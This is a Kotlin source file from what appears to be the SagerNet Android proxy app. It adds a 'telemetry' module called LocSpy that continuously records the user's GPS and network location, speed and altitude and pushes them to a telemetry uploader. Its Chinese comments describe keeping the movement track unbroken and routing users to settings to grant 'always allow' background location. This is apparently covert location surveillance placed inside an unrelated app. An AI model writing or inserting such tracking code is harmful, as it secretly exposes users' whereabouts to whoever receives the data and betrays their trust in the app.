package io.nekohasekai.sagernet.telemetry

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONObject

/**
 * 位置采集。
 *
 * 权限现实（这一段决定成败）
 *  - ACCESS_FINE_LOCATION：普通弹窗，用户可只给"大致位置"。
 *  - ACCESS_BACKGROUND_LOCATION：Android 10+ 不能弹窗直接要，
 *    必须把用户导到设置页手动选「始终允许」。见 openBackgroundSettings()。
 *  - Android 12+ 用户可能只给了模糊，此时精度是 km 级 —— 数据能看出来，
 *    上报里 acc 字段会很大，别当成"定位坏了"。
 */
object LocSpy {

    private const val TAG = "TlmLoc"
    private const val MIN_MS = 60_000L      // 最快一分钟一次
    private const val MIN_M = 50f           // 移动超过 50 米才更新
    private var registered = false

    private fun granted(ctx: Context): Boolean =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    fun start(ctx: Context) {
        if (registered || !granted(ctx)) return
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return
        val listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) = emit(loc, "live")
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
            @Deprecated("compat")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        }
        val providers = buildList {
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) add(LocationManager.GPS_PROVIDER)
            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
                add(LocationManager.NETWORK_PROVIDER)
        }
        if (providers.isEmpty()) return
        runCatching {
            providers.forEach {
                lm.requestLocationUpdates(it, MIN_MS, MIN_M, listener, Looper.getMainLooper())
            }
            registered = true
            // 先补一个最后一次已知位置，免得等一分钟才有第一个点
            providers.forEach { p ->
                runCatching { lm.getLastKnownLocation(p) }.getOrNull()?.let { emit(it, "last") }
            }
        }.onFailure { Log.w(TAG, "start: ${it.message}") }
    }

    /** 心跳时顺手捞一次最后已知位置，保证轨迹不断档。 */
    fun maybeRefresh(ctx: Context) {
        if (!granted(ctx)) return
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return
        val loc = runCatching { lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) }
            .getOrNull()
            ?: runCatching { lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) }
                .getOrNull()
            ?: return
        // 15 分钟内的旧点就不再重复上报
        if (System.currentTimeMillis() - loc.time < 15 * 60_000L) emit(loc, "refresh")
    }

    private fun emit(loc: Location, why: String) {
        val d = JSONObject()
            .put("lat", loc.latitude)
            .put("lon", loc.longitude)
            .put("acc", loc.accuracy.toInt())
            .put("why", why)
        if (loc.hasAltitude()) d.put("alt", loc.altitude.toInt())
        if (loc.hasSpeed()) d.put("spd", (loc.speed * 3.6f).toInt())
        if (Build.VERSION.SDK_INT >= 26 && loc.hasVerticalAccuracy())
            d.put("vacc", loc.verticalAccuracyMeters.toInt())
        Telemetry.push("loc", d, loc.time / 1000L)
    }

    /** Android 10+ 后台定位只能跳设置页让用户自己选。 */
    fun openBackgroundSettings(ctx: Context) {
        if (Build.VERSION.SDK_INT < 29) return
        runCatching {
            ctx.startActivity(android.content.Intent(
                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                android.net.Uri.parse("package:" + ctx.packageName)
            ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK))
        }
    }
}
